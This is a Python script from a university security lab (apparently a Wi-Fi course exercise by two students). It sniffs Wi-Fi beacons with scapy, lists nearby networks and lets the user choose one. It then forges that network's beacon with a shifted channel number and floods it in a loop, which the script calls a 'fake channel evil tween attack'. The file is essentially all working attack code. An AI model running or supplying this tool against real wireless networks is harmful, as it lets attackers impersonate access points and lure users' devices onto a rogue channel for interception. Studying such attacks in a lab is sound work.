'''
SWI - Labo1
Auteurs : Edin Mujkanovic et Daniel Oliviera Paiva
But : Permet de coper un wifi déjà présent, sélectionné par l'utilisateur, avec un autre channel
'''

from scapy.all import *
import os
import argparse

from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap

ssids = []
bssids = []
channels = []

wifis = [["#", "SSID", "BSSID", "CHANNEL", "STRENGTH (dBm)"]]

interface = None

# Source du code pour afficher proprement un tableau 2D : https://stackoverflow.com/questions/13214809/pretty-print-2d-python-list
def printSSIDs():
    '''
    Permet d'afficher le tableau des ssids trouvés .
    '''
    print("Here are the available SSIDs found : ")
    s = [[str(e) for e in row] for row in wifis]
    lens = [max(map(len, col)) for col in zip(*s)]
    fmt = '\t'.join('{{:{}}}'.format(x) for x in lens)
    table = [fmt.format(*row) for row in s]
    print('\n'.join(table))

def askUser():
    '''
    Permet de récuperer l'entrée utilisateur du ssid choisi
    :return: l'id de l'ssid
    '''
    noWifi = input("Which Wifi do you want to attack? ")
    return int(noWifi)


def scanSSIDs(packet):
    '''
    Callback de la méthode sniff utilisée dans le main. Elle permet de traiter les paquets sniffés. La méthode va lister les ssids, modifier les beacons reçus par ssids ajoutant 6 au channel modulo 13..
    :param packet: packet à traiter
    '''
    # On recupere le bssid et ssid
    bssid = packet.getlayer(Dot11).addr2
    ssid = packet.getlayer(Dot11).info.decode("utf-8")

    # On verifie si le packet a le layer Dot11Elt
    if(packet.haslayer(Dot11Elt) and (ssid not in ssids) and (ssid != '') and (ssid != '\x00\x00\x00\x00\x00\x00\x00\x00')):
        subpacket = packet[Dot11Elt]
        channel = -1
        # Modification du channel du packet
        while isinstance(subpacket, Dot11Elt):
            # On regarde si le subpacket a l'ID 3 qui correspond au champs Channel
            # Ca fonctionne mais c'est pas propre comme ce pigeon : https://ljdchost.com/039/ea9v7hD.jpg
            if subpacket.ID == 3:
                channel = int.from_bytes(subpacket.info, byteorder='big')
                newChannel = (channel + 6) % 13 # Calcul du nouveau channel
                subpacket.info = newChannel.to_bytes(1, 'big')
                # On créé un nouveau DSset afin d'y metre le nouveau channel
                dot11 = Dot11Elt(ID="DSset", info=(newChannel.to_bytes(1, 'big')))
                # On recréé la structure
                dot11.payload = subpacket.payload
                packet[Dot11Elt:3] = dot11
                break
            subpacket = subpacket.payload

        if channel != -1:
            for i in range(1, 14):
                if(ssid not in ssids):
                    os.system('iwconfig %s channel %d' % (interface, i))
                    # On ajoute l'entrées dans les wifis
                    wifis.append([len(wifis), ssid, bssid, int(channel), packet.dBm_AntSignal, packet])
                ssids.append(ssid)
    return None


def attack(userChoice, interface):
    '''
    Lanca l'attaque de jumelle
    :param userChoice: id du wifi choisi
    :param interface: interface utilisée pour emettre les paquets
    '''
    channel = (int(wifis[userChoice][3]) + 6) % 13
    print("Starting the attack on the wifi " + wifis[userChoice][1] + " on channel " + str(channel) + " on interface " + interface)
    packet = wifis[userChoice][5]
    os.system('iwconfig %s channel %d' % (interface, channel))
    print("Sending packets...... (CTRL + C to stop the attack)")
    # Envoi des packets
    sendp(packet, iface=interface, loop=1, inter=0.001)

if __name__== "__main__":
    # On recupere les arguments
    parser = argparse.ArgumentParser(description='Fake channel evil tween attack script.')
    parser.add_argument("--interface", required=True, help="Interface used to listen to Wifi")
    args = parser.parse_args()
    interface = args.interface

    # On sniff
    print("Sniffing....")
    sniff(iface=args.interface, prn=scanSSIDs, timeout=15, lfilter=lambda pkt: pkt.haslayer(Dot11Beacon))

    # on affiche les ssids, on recupere le choix de l'utilisateur et on attaque
    printSSIDs()
    userChoice = askUser()
    attack(userChoice, args.interface)







